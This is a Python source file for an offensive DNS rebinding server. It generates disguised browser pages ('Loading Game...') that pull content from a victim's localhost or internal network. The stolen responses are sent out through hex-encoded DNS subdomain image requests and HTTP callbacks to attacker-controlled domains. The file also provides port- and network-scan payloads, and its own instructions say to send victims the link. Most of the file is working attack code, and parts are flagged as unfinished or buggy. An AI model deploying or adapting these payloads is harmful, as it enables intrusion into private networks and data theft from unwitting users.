#!/usr/bin/env python3
"""
DNS-Rebinder - DNS rebinding attack server with interactive control.

Features:
- Multiple rebind strategies (count, time, round-robin, random, multi-target)
- Live configuration changes
- Subdomain data exfiltration capture
- Structured JSON logging

Based on cujanovic's dns.py for SSRF testing.
https://github.com/cujanovic/SSRF-Testing/blob/master/dns.py
"""

import argparse
import ipaddress
import datetime
import json
import random
import re
import sys
import time
from abc import ABC, abstractmethod
from collections import deque
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional

from twisted.internet import reactor, stdio, endpoints
from twisted.web import server as web_server, resource
from twisted.names import dns, server, hosts as hosts_module, client, cache, resolve, root
from twisted.protocols.basic import LineReceiver
from twisted.python.runtime import platform


# ============================================================================
# Payload Generator
# ============================================================================
#
# ⚠️  IN PROGRESS — NOT WORKING YET
#
# Browser DNS rebinding is tricky because browsers cache DNS aggressively
# (~60s for Chrome) regardless of TTL=0. The payloads work but require
# waiting for browser DNS cache to expire before rebind happens.
#
# For instant rebinding, use SSRF/server-side scenarios with count strategy.
#
# TODO: Investigate techniques to bypass browser DNS caching:
#   - Connection failure forcing re-resolution
#   - Multiple A records with failover
#   - WebSocket-based approaches
# ============================================================================

class PayloadGenerator:
    """Generate browser DNS rebinding attack payloads."""
    
    # Marker to detect our own payload page (so we know rebind hasn't happened yet)
    PAYLOAD_MARKER = '<!-- DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c -->'
    
    @staticmethod
    def single_target(
        domain: str,
        target_port: int = 80,
        target_path: str = "/",
        delay_ms: int = 3000,
        poll_interval_ms: int = 2000,
        max_attempts: int = 60,
        exfil_domain: Optional[str] = None,
        exfil_callback: Optional[str] = None,
        rebinder_base: Optional[str] = None,
    ) -> str:
        """
        Generate payload to steal response from single target.
        
        Args:
            domain: Attack domain (e.g., attack.evil.com)
            target_port: Port to hit after rebind
            target_path: Path to fetch
            delay_ms: Initial delay before first rebind attempt (browser DNS cache)
            poll_interval_ms: Seconds between rebind attempts
            max_attempts: Maximum number of rebind attempts
            exfil_domain: Domain for DNS exfil (e.g., exfil.evil.com)
            exfil_callback: HTTP URL for data exfil
        """
        exfil_code = ""
        if exfil_domain:
            exfil_code += f'''
            // DNS exfil using hex (case-insensitive, survives DNS)
            const dnsExfil = (data) => {{
                // Convert to hex (case-insensitive, works with DNS)
                const hex = Array.from(data).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
                // Split into chunks (DNS label max 63 chars, use 60 for safety)
                const chunks = hex.match(/.{{1,60}}/g) || [];
                chunks.forEach((chunk, i) => {{
                    const img = new Image();
                    img.src = 'http://' + chunk + '.c' + i + '.{exfil_domain}/x.png?' + Date.now();
                }});
            }};
            dnsExfil(data);'''
        
        if exfil_callback:
            exfil_code += f'''
            // HTTP callback exfil
            fetch('{exfil_callback}', {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({{url: targetUrl, data: data, ts: Date.now()}})
            }}).catch(() => {{}});'''
        
        if not exfil_code:
            exfil_code = '''
            console.log('STOLEN DATA:', data);
            alert('Rebind successful! Check console for data.');'''
        
        marker = PayloadGenerator.PAYLOAD_MARKER
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    {marker}
    <style>
        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
        .status {{ padding: 20px; border-radius: 8px; margin: 10px 0; }}
        .waiting {{ background: #16213e; }}
        .attacking {{ background: #1f4068; }}
        .success {{ background: #1b4332; }}
        .error {{ background: #641220; }}
        #log {{ font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }}
    </style>
</head>
<body>
    <h1>🎮 Loading Game...</h1>
    <div id="status" class="status waiting">Initializing...</div>
    <div id="log"></div>
    
    <script>
    // Marker used to detect if we're still hitting our own server
    const PAYLOAD_MARKER = 'DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c';
    
    const CONFIG = {{
        // window.location.port is empty string for default ports (80/443)
        targetPort: window.location.port ? parseInt(window.location.port) : (window.location.protocol === 'https:' ? 443 : 80),
        targetPath: '{target_path}',
        delayMs: {delay_ms},
        maxAttempts: {max_attempts},
        attemptIntervalMs: {poll_interval_ms}
    }};
    
    // Check if we need to redirect to unique subdomain for same-origin fetch
    // For browser rebinding attacks, we want a dedicated rebinding namespace like: *.rb.<domain>
    // If rebinder_base is provided server-side, use it. Otherwise fall back to last 2 labels.
    const rebinderBase = "{rebinder_base or ''}";
    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
    const currentHost = window.location.hostname;
    const currentPort = window.location.port || '80';
    
    // If we're not on a random subdomain yet, OR not on target port, redirect
    const needsRedirect = !currentHost.startsWith('r') || 
                          currentHost.split('.').length < 3 || 
                          currentPort !== String(CONFIG.targetPort);
    
    if (needsRedirect) {{
        const uniqueHost = 'r' + Math.random().toString(36).slice(2, 10) + '.' + baseDomain;
        // Redirect to TARGET PORT so fetch is same-origin
        const pathname = window.location.pathname || '/';
        const search = window.location.search || '';
        const newUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + pathname + search;
        console.log('DEBUG: pathname=' + pathname + ', search=' + search);
        console.log('DEBUG: Redirecting to: ' + newUrl);
        window.location.href = newUrl;
        throw new Error('Redirecting...');
    }}
    
    const status = document.getElementById('status');
    const log = document.getElementById('log');
    
    function addLog(msg) {{
        const ts = new Date().toISOString().split('T')[1].slice(0,12);
        log.textContent += '[' + ts + '] ' + msg + '\\n';
        log.scrollTop = log.scrollHeight;
        console.log(msg);
    }}
    
    function setStatus(msg, cls) {{
        status.textContent = msg;
        status.className = 'status ' + cls;
    }}
    
    async function tryRebind(attempt) {{
        // Use current hostname (already unique from redirect) for same-origin
        const targetUrl = 'http://' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
        addLog('Attempt ' + attempt + '/' + CONFIG.maxAttempts + ': Fetching ' + targetUrl);
        
        try {{
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            
            const resp = await fetch(targetUrl, {{ 
                signal: controller.signal,
                cache: 'no-store'
            }});
            clearTimeout(timeout);
            
            const data = await resp.text();
            
            // Check if we got our OWN page (rebind hasn't happened yet)
            if (data.includes(PAYLOAD_MARKER)) {{
                addLog('⏳ Still hitting rebinder server (' + data.length + ' bytes) - waiting for DNS cache...');
                return null; // null = keep trying, rebind not complete
            }}
            
            // Got different content - rebind worked!
            addLog('🎉 SUCCESS! Got ' + data.length + ' bytes from TARGET');
            setStatus('🎉 Rebind successful! Exfiltrating ' + data.length + ' bytes...', 'success');
            
            // Show preview
            const preview = data.substring(0, 500);
            addLog('--- Response Preview ---');
            addLog(preview + (data.length > 500 ? '\\n... [truncated]' : ''));
            addLog('--- End Preview ---');
            
            // Exfiltrate{exfil_code}
            
            return true;
            
        }} catch (e) {{
            if (e.name === 'AbortError') {{
                addLog('⏱️ Timeout - target may be slow or filtered');
            }} else {{
                addLog('❌ Error: ' + e.message);
            }}
            return false;
        }}
    }}
    
    async function main() {{
        const totalTime = CONFIG.delayMs + (CONFIG.maxAttempts * CONFIG.attemptIntervalMs);
        setStatus('⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache...', 'waiting');
        addLog('=== DNS Rebinding Attack ===');
        addLog('Target: ' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath);
        addLog('Strategy: Wait ' + (CONFIG.delayMs/1000) + 's, then poll every ' + (CONFIG.attemptIntervalMs/1000) + 's');
        addLog('Max duration: ~' + Math.round(totalTime/1000) + 's (' + CONFIG.maxAttempts + ' attempts)');
        addLog('');
        addLog('Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache to expire...');
        addLog('(Chrome caches ~1min, Firefox varies, Safari ~few seconds)');
        
        await new Promise(r => setTimeout(r, CONFIG.delayMs));
        
        setStatus('🔄 Polling for rebind...', 'attacking');
        addLog('');
        addLog('=== Starting rebind attempts ===');
        
        for (let i = 1; i <= CONFIG.maxAttempts; i++) {{
            const result = await tryRebind(i);
            
            if (result === true) {{
                // Success! We got target data
                return;
            }}
            
            if (result === false) {{
                // Error (not just "still our page") - might be worth retrying
            }}
            
            // result === null means still hitting our server, keep polling
            
            if (i < CONFIG.maxAttempts) {{
                setStatus('🔄 Attempt ' + i + '/' + CONFIG.maxAttempts + ' - waiting ' + (CONFIG.attemptIntervalMs/1000) + 's...', 'attacking');
                await new Promise(r => setTimeout(r, CONFIG.attemptIntervalMs));
            }}
        }}
        
        setStatus('❌ Rebind failed after ' + CONFIG.maxAttempts + ' attempts', 'error');
        addLog('');
        addLog('=== Attack failed ===');
        addLog('Possible causes:');
        addLog('  - Browser DNS cache not expiring (try longer delay)');
        addLog('  - Target port not open');
        addLog('  - Firewall blocking');
        addLog('  - DNS not rebinding (check server logs)');
    }}
    
    main();
    </script>
</body>
</html>'''

    @staticmethod
    def port_scan(
        domain: str,
        ports: list[int],
        delay_ms: int = 3000,
        exfil_domain: Optional[str] = None,
        rebinder_base: Optional[str] = None,
    ) -> str:
        """Generate payload to scan ports on rebind target."""
        
        ports_js = json.dumps(ports)
        
        exfil_code = ""
        if exfil_domain:
            exfil_code = f'''
            const dnsExfil = (port, status) => {{
                const img = new Image();
                img.src = 'http://port' + port + '-' + status + '.{exfil_domain}/x.png?' + Date.now();
            }};
            dnsExfil(port, open ? 'open' : 'closed');'''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
        th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
        th {{ background: #16213e; }}
        .open {{ color: #4ade80; font-weight: bold; }}
        .closed {{ color: #666; }}
        .pending {{ color: #fbbf24; }}
        #status {{ padding: 15px; background: #16213e; border-radius: 8px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <h1>🔍 Port Scanner</h1>
    <div id="status">Waiting for DNS TTL to expire...</div>
    <table>
        <thead><tr><th>Port</th><th>Status</th><th>Response</th></tr></thead>
        <tbody id="results"></tbody>
    </table>
    
    <script>
    const CONFIG = {{
        ports: {ports_js},
        delayMs: {delay_ms},
        timeoutMs: 2000
    }};
    
    const rebinderBase = "{rebinder_base or ''}";
    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
    const results = document.getElementById('results');
    const status = document.getElementById('status');
    
    // Initialize table
    CONFIG.ports.forEach(port => {{
        const row = document.createElement('tr');
        row.id = 'port-' + port;
        row.innerHTML = '<td>' + port + '</td><td class="pending">⏳ Pending</td><td>-</td>';
        results.appendChild(row);
    }});
    
    async function checkPort(port) {{
        const row = document.getElementById('port-' + port);
        // Fresh subdomain each request to bypass DNS cache
        const uniqueHost = 'r' + Math.random().toString(36).slice(2) + '.' + baseDomain;
        const url = 'http://' + uniqueHost + ':' + port + '/';
        
        try {{
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
            
            const resp = await fetch(url, {{ 
                signal: controller.signal,
                cache: 'no-store'
            }});
            clearTimeout(timeout);
            
            const text = await resp.text();
            const preview = text.slice(0, 50).replace(/</g, '&lt;');
            
            // Check if we got our own page
            if (text.includes('Port Scanner')) {{
                row.innerHTML = '<td>' + port + '</td><td class="pending">🔄 Rebinding...</td><td>Got own page</td>';
                return null; // Rebind not complete
            }}
            
            row.innerHTML = '<td>' + port + '</td><td class="open">✅ OPEN</td><td>' + preview + '...</td>';
            {exfil_code.replace('open ? ', 'true ? ') if exfil_code else ''}
            return true;
            
        }} catch (e) {{
            row.innerHTML = '<td>' + port + '</td><td class="closed">❌ Closed</td><td>' + e.message + '</td>';
            {exfil_code.replace('open ? ', 'false ? ') if exfil_code else ''}
            return false;
        }}
    }}
    
    async function main() {{
        status.textContent = '⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL...';
        await new Promise(r => setTimeout(r, CONFIG.delayMs));
        
        status.textContent = '🔄 Scanning ports...';
        
        // Try a few times to ensure rebind happened
        for (let attempt = 0; attempt < 10; attempt++) {{
            let rebindComplete = true;
            
            for (const port of CONFIG.ports) {{
                const result = await checkPort(port);
                if (result === null) rebindComplete = false;
                await new Promise(r => setTimeout(r, 100));
            }}
            
            if (rebindComplete) break;
            await new Promise(r => setTimeout(r, 1000));
        }}
        
        status.textContent = '✅ Scan complete';
    }}
    
    main();
    </script>
</body>
</html>'''

    @staticmethod
    def network_scan(
        domain: str,
        port: int = 80,
        delay_ms: int = 3000,
        exfil_domain: Optional[str] = None,
        rebinder_base: Optional[str] = None,
    ) -> str:
        """
        Generate payload for network scanning.
        Uses multi-target strategy - each DNS query returns different IP.
        """
        
        exfil_code = ""
        if exfil_domain:
            exfil_code = f'''
                const dnsExfil = (ip, port, status) => {{
                    const encoded = ip.replace(/\\./g, '-');
                    const img = new Image();
                    img.src = 'http://' + encoded + '-p' + port + '-' + status + '.{exfil_domain}/x.png';
                }};
                dnsExfil(targetIp, {port}, open ? 'open' : 'closed');'''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
        #log {{ font-family: monospace; font-size: 12px; background: #0d1117; padding: 15px; 
                border-radius: 8px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; }}
        .found {{ color: #4ade80; }}
        .miss {{ color: #666; }}
        #status {{ padding: 15px; background: #16213e; border-radius: 8px; margin-bottom: 20px; }}
        #found {{ background: #1b4332; padding: 15px; border-radius: 8px; margin-top: 20px; }}
        #found h3 {{ margin-top: 0; }}
    </style>
</head>
<body>
    <h1>🌐 Network Scanner</h1>
    <p>Using DNS rebinding with multi-target strategy. Each request resolves to a different internal IP.</p>
    <div id="status">Initializing...</div>
    <div id="found"><h3>🎯 Hosts Found</h3><div id="hosts">None yet...</div></div>
    <h3>📋 Scan Log</h3>
    <div id="log"></div>
    
    <script>
    const CONFIG = {{
        port: {port},
        delayMs: {delay_ms},
        scanCount: 50,  // Number of IPs to try (depends on your rebind IP list)
        timeoutMs: 2000
    }};
    
    const rebinderBase = "{rebinder_base or ''}";
    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
    const logEl = document.getElementById('log');
    const status = document.getElementById('status');
    const hostsEl = document.getElementById('hosts');
    const foundHosts = [];
    let scanNum = 0;
    
    function log(msg, cls) {{
        const line = document.createElement('div');
        line.className = cls || '';
        line.textContent = '[' + new Date().toISOString().split('T')[1].slice(0,8) + '] ' + msg;
        logEl.appendChild(line);
        logEl.scrollTop = logEl.scrollHeight;
    }}
    
    async function probe() {{
        scanNum++;
        // Use unique subdomain to force new DNS lookup each time
        const uniqueHost = 'scan' + scanNum + '-' + Date.now() + '.' + baseDomain;
        const url = 'http://' + uniqueHost + ':' + CONFIG.port + '/';
        
        try {{
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
            
            const resp = await fetch(url, {{ 
                signal: controller.signal,
                cache: 'no-store'
            }});
            clearTimeout(timeout);
            
            const text = await resp.text();
            
            // Try to identify the target IP from response
            // (Your DNS server cycles through IPs)
            const targetIp = 'IP #' + scanNum; // In reality, check response content
            
            if (!text.includes('Network Scanner')) {{
                log('✅ FOUND: ' + subdomain + ' - got ' + text.length + ' bytes', 'found');
                foundHosts.push({{ subdomain, size: text.length, preview: text.slice(0, 100) }});
                hostsEl.innerHTML = foundHosts.map(h => 
                    '<div class="found">• ' + h.subdomain + ' (' + h.size + ' bytes)</div>'
                ).join('');
                {exfil_code.replace('open ? ', 'true ? ') if exfil_code else ''}
                return true;
            }}
            
            log('🔄 ' + subdomain + ' - got own page (rebind pending)', 'miss');
            return null;
            
        }} catch (e) {{
            log('❌ ' + subdomain + ' - ' + e.message, 'miss');
            {exfil_code.replace('open ? ', 'false ? ') if exfil_code else ''}
            return false;
        }}
    }}
    
    async function main() {{
        status.textContent = '⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL...';
        log('Target port: ' + CONFIG.port);
        log('Waiting for DNS cache to expire...');
        
        await new Promise(r => setTimeout(r, CONFIG.delayMs));
        
        status.textContent = '🔄 Scanning network (using multi-target rebind)...';
        log('Starting network scan...');
        log('Each request uses unique subdomain → new DNS lookup → next IP in cycle');
        
        for (let i = 0; i < CONFIG.scanCount; i++) {{
            await probe();
            await new Promise(r => setTimeout(r, 200));
            status.textContent = '🔄 Scanning... (' + (i+1) + '/' + CONFIG.scanCount + ')';
        }}
        
        status.textContent = '✅ Scan complete. Found ' + foundHosts.length + ' hosts.';
        log('Scan complete!');
    }}
    
    main();
    </script>
</body>
</html>'''


# ============================================================================
# Payload HTTP Server
# ============================================================================

class PayloadResource(resource.Resource):
    """HTTP server for serving attack payloads."""
    
    isLeaf = False
    
    def __init__(self, config_ref):
        super().__init__()
        self.config_ref = config_ref
        self.payloads = {}  # path -> html content
    
    def getChild(self, path, request):
        return PayloadPage(self, path.decode() if isinstance(path, bytes) else path)
    
    def render_GET(self, request):
        request.setHeader(b'Content-Type', b'text/html')
        
        html = f'''<!DOCTYPE html>
<html>
<head><title>DNS-Rebinder Payloads</title>
<style>
    body {{ font-family: system-ui; padding: 40px; background: #1a1a2e; color: #eee; max-width: 800px; margin: 0 auto; }}
    a {{ color: #60a5fa; }}
    .payload {{ background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; }}
    code {{ background: #0d1117; padding: 2px 6px; border-radius: 4px; }}
</style>
</head>
<body>
<h1>🎯 DNS-Rebinder Payload Server</h1>
<p>Domain: <code>{self.config_ref.domain}</code></p>
<p>Rebind IPs: <code>{', '.join(self.config_ref.rebind_ips)}</code></p>

<h2>Available Payloads</h2>
<div class="payload">
    <h3><a href="/single">/single</a> - Single Target</h3>
    <p>Steal response from one target. Defaults to fast mode (instant polling).</p>
    <code>/single?path=/admin</code>
    <p style="font-size: 0.9em; color: #888; margin-top: 8px;">
        <b>Defaults (fast):</b> delay=0, interval=100ms, attempts=300 (30s)<br>
        <b>Browser mode:</b> ?delay=70000&amp;interval=2000&amp;attempts=60
    </p>
</div>

<div class="payload">
    <h3><a href="/portscan">/portscan</a> - Port Scanner</h3>
    <p>Scan ports on rebind target.</p>
    <code>/portscan?ports=80,443,8080,3000,5000</code>
</div>

<div class="payload">
    <h3><a href="/netscan">/netscan</a> - Network Scanner</h3>
    <p>Scan internal network (use with multi-target strategy).</p>
    <code>/netscan?port=80&count=50</code>
</div>

<h2>Quick Links</h2>
<ul>
    <li><a href="/single?port=8080&path=/">Scan localhost:8080</a></li>
    <li><a href="/single?port=80&path=/server-status">Apache server-status</a></li>
    <li><a href="/portscan?ports=22,80,443,3000,3306,5000,5432,6379,8080,8443,9200,27017">Common ports</a></li>
</ul>

<h2>Usage</h2>
<ol>
    <li>Set up DNS for your domain pointing to this server</li>
    <li>Start dns-rebinder with desired rebind IPs</li>
    <li>Send victim link: <code>http://attack.{self.config_ref.domain}:8080/single?port=3000</code></li>
    <li>Victim's browser loads page, waits, then fetches from their localhost!</li>
</ol>
</body>
</html>'''
        return html.encode()


class PayloadPage(resource.Resource):
    """Individual payload page."""
    
    isLeaf = True
    
    def __init__(self, parent, path):
        super().__init__()
        self.parent = parent
        self.path = path
    
    def render_GET(self, request):
        request.setHeader(b'Content-Type', b'text/html')
        request.setHeader(b'Cache-Control', b'no-store')
        
        cfg = self.parent.config_ref
        domain = cfg.domain
        exfil = f"{cfg.exfil_prefix}.{domain}"
        
        # Parse query params
        args = {k.decode(): v[0].decode() for k, v in request.args.items()}
        
        if self.path in ('single', 'fast'):
            # Port auto-detected from URL, fallback to param, fallback to 80
            port = int(args.get('port', 80))  # Only used as JS fallback
            path = args.get('path', '/')
            
            # Default: fast mode (no delay, rapid polling)
            # For slow browsers, use ?delay=70000&interval=2000&attempts=60
            delay = int(args.get('delay', 0))
            poll_interval = int(args.get('interval', 100))
            max_attempts = int(args.get('attempts', 300))
            
            html = PayloadGenerator.single_target(
                domain=domain,
                target_port=port,
                target_path=path,
                delay_ms=delay,
                poll_interval_ms=poll_interval,
                max_attempts=max_attempts,
                exfil_domain=exfil,
                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
            )
            
        elif self.path == 'portscan':
            # Default ports: common web servers, frameworks, admin panels
            # 80/443: Apache, Nginx, IIS
            # 8080/8443: Tomcat, Jenkins, alt HTTP/HTTPS
            # 3000: Node.js, React dev, Grafana
            # 5000: Flask, Docker Registry
            # 8000: Django, Python http.server
            # 4200: Angular dev
            # 8888: Jupyter Notebook
            # 9000: PHP-FPM, SonarQube
            # 9090: Prometheus
            # 9200: Elasticsearch
            # 5601: Kibana
            # 3306: MySQL (web UIs)
            # 5432: PostgreSQL (web UIs)
            # 6379: Redis (web UIs)
            # 27017: MongoDB (web UIs)
            # 8081: Nexus, misc
            # 4443: alt HTTPS
            # 8888: JDWP, Jupyter
            # 10000: Webmin
            default_ports = '80,443,8080,8443,3000,5000,8000,4200,8888,9000,9090,9200,5601,8081,4443,10000,3001,5001,8001,4000'
            ports_str = args.get('ports', default_ports)
            ports = [int(p) for p in ports_str.split(',')]
            delay = int(args.get('delay', 60000))
            
            html = PayloadGenerator.port_scan(
                domain=domain,
                ports=ports,
                delay_ms=delay,
                exfil_domain=exfil,
                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
            )
            
        elif self.path == 'netscan':
            port = int(args.get('port', 80))
            delay = int(args.get('delay', 60000))
            
            html = PayloadGenerator.network_scan(
                domain=domain,
                port=port,
                delay_ms=delay,
                exfil_domain=exfil,
                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
            )
            
        else:
            html = f'<h1>Unknown payload: {self.path}</h1><p><a href="/">Back to index</a></p>'
        
        return html.encode()


# ============================================================================
# Rebind Strategies
# ============================================================================

class StrategyType(Enum):
    COUNT = "count"
    TIME = "time"
    ROUND_ROBIN = "round-robin"
    RANDOM = "random"
    MULTI_TARGET = "multi-target"


class RebindStrategy(ABC):
    """Base class for rebind strategies."""
    
    @abstractmethod
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str], 
               query_count: int, first_seen: float) -> str:
        """Determine which IP to return."""
        pass
    
    @abstractmethod
    def describe(self) -> str:
        """Human-readable description."""
        pass


class CountStrategy(RebindStrategy):
    """Rebind after N queries."""
    
    def __init__(self, threshold: int = 1):
        self.threshold = threshold
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count < self.threshold:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return f"count (rebind after {self.threshold} queries)"


class TimeStrategy(RebindStrategy):
    """Rebind after N seconds from first query."""
    
    def __init__(self, delay_seconds: float = 5.0):
        self.delay_seconds = delay_seconds
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        elapsed = time.time() - first_seen
        if elapsed < self.delay_seconds:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return f"time (rebind after {self.delay_seconds}s)"


class RoundRobinStrategy(RebindStrategy):
    """Alternate between whitelist and rebind IPs."""
    
    def __init__(self):
        pass
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count % 2 == 0:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return "round-robin (alternate whitelist/rebind)"


class RandomStrategy(RebindStrategy):
    """Probabilistic rebinding."""
    
    def __init__(self, rebind_probability: float = 0.5):
        self.rebind_probability = rebind_probability
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        # First query always whitelist (need at least one to pass validation)
        if query_count == 0:
            return whitelist_ip
        if random.random() < self.rebind_probability:
            return rebind_ips[0]
        return whitelist_ip
    
    def describe(self) -> str:
        return f"random ({int(self.rebind_probability * 100)}% rebind chance)"


class MultiTargetStrategy(RebindStrategy):
    """Cycle through multiple rebind targets."""
    
    def __init__(self, threshold: int = 1):
        self.threshold = threshold  # Whitelist queries before cycling
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count < self.threshold:
            return whitelist_ip
        # Cycle through rebind IPs
        idx = (query_count - self.threshold) % len(rebind_ips)
        return rebind_ips[idx]
    
    def describe(self) -> str:
        return f"multi-target (cycle rebind IPs after {self.threshold} queries)"


def create_strategy(strategy_type: StrategyType, **kwargs) -> RebindStrategy:
    """Factory for creating strategies."""
    if strategy_type == StrategyType.COUNT:
        return CountStrategy(threshold=kwargs.get('threshold', 1))
    elif strategy_type == StrategyType.TIME:
        return TimeStrategy(delay_seconds=kwargs.get('delay', 5.0))
    elif strategy_type == StrategyType.ROUND_ROBIN:
        return RoundRobinStrategy()
    elif strategy_type == StrategyType.RANDOM:
        return RandomStrategy(rebind_probability=kwargs.get('probability', 0.5))
    elif strategy_type == StrategyType.MULTI_TARGET:
        return MultiTargetStrategy(threshold=kwargs.get('threshold', 1))
    else:
        raise ValueError(f"Unknown strategy: {strategy_type}")


# ============================================================================
# Logging
# ============================================================================

class Logger:
    """Structured logging with JSON support."""
    
    def __init__(self, log_dir: Path = Path(".")):
        self.log_dir = log_dir
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        self.main_log = self.log_dir / f"dns-rebind-{timestamp}.log"
        self.json_log = self.log_dir / f"dns-rebind-{timestamp}.json"
        self.exfil_log = self.log_dir / f"dns-exfil-{timestamp}.log"
        
        # Write JSON array start
        with open(self.json_log, 'w') as f:
            f.write('[\n')
        self._json_first = True
    
    def _timestamp(self) -> str:
        return datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    def _write_json(self, entry: dict):
        """Append JSON entry."""
        with open(self.json_log, 'a') as f:
            prefix = '' if self._json_first else ',\n'
            self._json_first = False
            f.write(prefix + json.dumps(entry))
    
    def info(self, message: str, to_stdout: bool = True):
        """Log info message."""
        line = f"[{self._timestamp()}] {message}"
        if to_stdout:
            print(line)
        with open(self.main_log, 'a') as f:
            f.write(line + '\n')
    
    def query(self, hostname: str, response_ip: str, source_ip: str, 
              source_port: int, query_type: str, is_rebind: bool,
              query_count: int, strategy: str):
        """Log DNS query with full details."""
        now = datetime.datetime.now()
        
        # Console output (colorized)
        status = "→ REBIND" if is_rebind else "→ whitelist"
        color = "\033[91m" if is_rebind else "\033[92m"
        reset = "\033[0m"
        
        print(f"[{self._timestamp()}] {color}{query_type:4}{reset} {hostname}")
        print(f"             {color}{status:12}{reset} {response_ip} (query #{query_count + 1})")
        print(f"             from {source_ip}:{source_port}")
        
        # Main log (plain text)
        with open(self.main_log, 'a') as f:
            f.write(f"[{self._timestamp()}] {query_type} {hostname} -> {response_ip} "
                   f"({'REBIND' if is_rebind else 'whitelist'}) from {source_ip}:{source_port}\n")
        
        # JSON log (structured)
        entry = {
            "timestamp": now.isoformat(),
            "type": "query",
            "query_type": query_type,
            "hostname": hostname,
            "response_ip": response_ip,
            "source_ip": source_ip,
            "source_port": source_port,
            "is_rebind": is_rebind,
            "query_count": query_count + 1,
            "strategy": strategy
        }
        self._write_json(entry)
    
    def exfil(self, full_hostname: str, extracted_data: str, source_ip: str):
        """Log exfiltrated subdomain data."""
        now = datetime.datetime.now()
        
        # Console (highlighted)
        print(f"\033[95m[{self._timestamp()}] EXFIL\033[0m {extracted_data}")
        print(f"             from {full_hostname} ({source_ip})")
        
        # Exfil-specific log
        with open(self.exfil_log, 'a') as f:
            f.write(f"[{now.isoformat()}] {extracted_data}\n")
            f.write(f"  hostname: {full_hostname}\n")
            f.write(f"  source: {source_ip}\n\n")
        
        # JSON log
        entry = {
            "timestamp": now.isoformat(),
            "type": "exfil",
            "hostname": full_hostname,
            "data": extracted_data,
            "source_ip": source_ip
        }
        self._write_json(entry)
    
    def config_change(self, setting: str, old_value: str, new_value: str):
        """Log configuration change."""
        self.info(f"CONFIG: {setting}: {old_value} -> {new_value}")
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "type": "config_change",
            "setting": setting,
            "old_value": old_value,
            "new_value": new_value
        }
        self._write_json(entry)
    
    def close(self):
        """Close JSON array."""
        with open(self.json_log, 'a') as f:
            f.write('\n]\n')


# ============================================================================
# Server Configuration
# ============================================================================

@dataclass 
class HostState:
    """Per-hostname tracking state."""
    query_count: int = 0
    first_seen: float = field(default_factory=time.time)
    last_response: str = ""


@dataclass
class ServerConfig:
    """Server configuration and state."""
    whitelist_ip: str
    rebind_ips: list[str]
    server_ip: str
    port: int
    domain: str
    ttl: int = 0
    strategy: RebindStrategy = field(default_factory=lambda: CountStrategy(1))

    # Hostnames that must NEVER be rebound (always return server_ip).
    # This is critical when your zone is also used for other services (e.g. Interactsh)
    # and you need a stable hostname to serve the initial browser payload.
    static_hosts: list[str] = field(default_factory=list)
    
    # Exfiltration settings
    exfil_prefix: str = "exfil"  # e.g., data.exfil.evil.com
    
    # HTTP payload server
    http_port: int = 8080
    enable_http: bool = False
    rb_zone: str = ""  # e.g. rb.nsish.com (used by browser payload redirects)
    
    # Ranges to filter from logs (noisy resolvers)
    quiet_ranges: list = field(default_factory=lambda: [
        '172.253.0.0/16',
        '172.217.0.0/16'
    ])
    
    # State tracking
    host_states: dict[str, HostState] = field(default_factory=dict)
    recent_queries: deque = field(default_factory=lambda: deque(maxlen=100))
    
    # Stats
    total_queries: int = 0
    total_rebinds: int = 0
    total_exfils: int = 0
    
    # Logger
    logger: Optional[Logger] = None
    
